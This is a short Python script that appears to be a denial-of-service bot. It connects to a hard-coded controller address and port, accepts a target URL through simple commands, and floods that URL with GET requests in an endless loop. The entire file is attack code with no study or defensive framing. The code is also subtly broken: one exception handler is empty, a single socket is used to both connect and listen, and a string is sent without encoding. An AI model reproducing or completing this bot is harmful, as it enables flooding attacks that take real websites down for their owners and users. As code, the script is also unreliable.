import socket, os, requests, sys

ip = '10.9.1.88'
mahp ='10.9.1.88'
port = 1234

def doz(url):
	try:
		while True:
			r = requests.get(url)

	except:

def c_listen():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.bind((ip, port))
		s.listen(1)
		con, adr = s.accept()

		url = ''

		while True:
			cmd = s.recv(1024).decode()
			if cmd == 'gg':
				s.send(('connection closed..'))
				s.close()
				break
			elif cmd == 'target':
				s.send(('tar'.encode()))
				if s.recv(1024):
					s.send(('target loaded'.encode()))
				url = s.recv(1024).decode()
			elif cmd == 'start':
				doz(url)
			else:
				s.send(('command not found!'.encode()))

	except:
		print('Err')
